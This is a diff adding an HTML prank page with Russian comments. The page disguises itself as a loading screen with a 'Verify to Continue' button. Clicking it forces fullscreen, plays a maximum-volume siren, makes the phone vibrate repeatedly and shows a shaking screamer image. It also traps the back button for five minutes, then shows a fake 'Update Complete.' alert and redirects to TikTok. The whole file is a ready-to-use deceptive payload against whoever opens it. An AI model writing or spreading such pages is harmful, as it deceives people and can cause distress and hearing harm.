@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; color: #fff; font-family: sans-serif; touch-action: none; }
+        
+        /* Стартовый экран для обхода блокировки звука */
+        #startScreen {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            background: #000; z-index: 9999;
+        }
+        #startBtn {
+            padding: 20px 40px; font-size: 20px; background: #fe2c55; color: #fff;
+            border: none; border-radius: 8px; font-weight: bold;
+        }
+
+        /* Экран скримера */
+        #screamer {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #000; z-index: 99999; justify-content: center; align-items: center; overflow: hidden;
+        }
+        
+        /* Картинка скримера (растянута на весь экран) */
+        #screamer img {
+            width: 100%; height: 100%; object-fit: cover;
+            animation: shake 0.1s infinite; /* Тряска */
+        }
+
+        /* Текст поверх картинки */
+        #screamerText {
+            position: absolute; bottom: 50px; width: 100%; text-align: center;
+            font-size: 30px; color: red; font-weight: bold; text-shadow: 2px 2px 0 #000;
+            animation: pulse 0.5s infinite;
+        }
+
+        @keyframes shake {
+            0% { transform: translate(2px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(0px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(2px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(2px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Стартовый экран -->
+    <div id="startScreen">
+        <button id="startBtn">Verify to Continue</button>
+    </div>
+
+    <!-- Экран скримера -->
+    <div id="screamer">
+        <!-- Замени ссылку на свою картинку (лучше в base64) -->
+        <img src="https://i.pinimg.com/736x/41/2b/66/412b66db1f0d0e5f6e3d837e9b0f6a1e.jpg" alt="SCREAMER">
+        <div id="screamerText">SYSTEM FAILURE</div>
+    </div>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const startScreen = document.getElementById('startScreen');
+        const screamer = document.getElementById('screamer');
+        
+        let audioCtx = null;
+        let oscillator = null;
+        let gainNode = null;
+
+        startBtn.addEventListener('click', () => {
+            startScreen.style.display = 'none';
+            screamer.style.display = 'flex';
+            
+            // 1. Пытаемся включить полный экран
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => {});
+            }
+
+            // 2. Запускаем оглушительный звук
+            playScream();
+
+            // 3. Трясем телефон (Вибрация)
+            if (navigator.vibrate) {
+                navigator.vibrate([1000, 200, 1000, 200, 1000, 500]);
+                // Повторяем вибрацию каждые 3 секунды
+                setInterval(() => navigator.vibrate([1000, 200, 1000, 200, 1000]), 3000);
+            }
+
+            // 4. Блокируем кнопку "Назад"
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () { history.go(1); };
+
+            // 5. Таймер на 5 минут (300 000 мс)
+            setTimeout(() => {
+                stopScream();
+                screamer.style.display = 'none';
+                alert("Update Complete.");
+                window.location.href = "https://www.tiktok.com";
+            }, 300000); // 5 минут
+        });
+
+        function playScream() {
+            try {
+                // Создаем аудио-контекст
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // Создаем генератор звука (осциллятор)
+                oscillator = audioCtx.createOscillator();
+                gainNode = audioCtx.createGain();
+                
+                // Настраиваем звук: пилообразная волна (самый противный и резкий звук)
+                oscillator.type = 'sawtooth';
+                
+                // Модуляция частоты (имитация крика/сирены)
+                oscillator.frequency.setValueAtTime(1200, audioCtx.currentTime);
+                oscillator.frequency.linearRampToValueAtTime(800, audioCtx.currentTime + 0.5);
+                oscillator.frequency.linearRampToValueAtTime(1500, audioCtx.currentTime + 1);
+                oscillator.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 1.5);
+                
+                // Чтобы звук не был прямым, делаем цикл модуляции
+                const lfo = audioCtx.createOscillator();
+                lfo.type = 'square';
+                lfo.frequency.value = 10; // 10 Гц вибрация
+                const lfoGain = audioCtx.createGain();
+                lfoGain.gain.value = 300;
+                lfo.connect(lfoGain);
+                lfoGain.connect(oscillator.frequency);
+                lfo.start();
+
+                // Устанавливаем МАКСИМАЛЬНУЮ громкость (1.0)
+                gainNode.gain.setValueAtTime(1.0, audioCtx.currentTime);
+                
+                // Подключаем к динамикам
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                
+                // Запускаем
+                oscillator.start();
+            } catch(e) {
+                console.log("Аудио заблокировано", e);
+            }
+        }
+
+        function stopScream() {
+            try {
+                if (oscillator) oscillator.stop();
+                if (audioCtx) audioCtx.close();
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
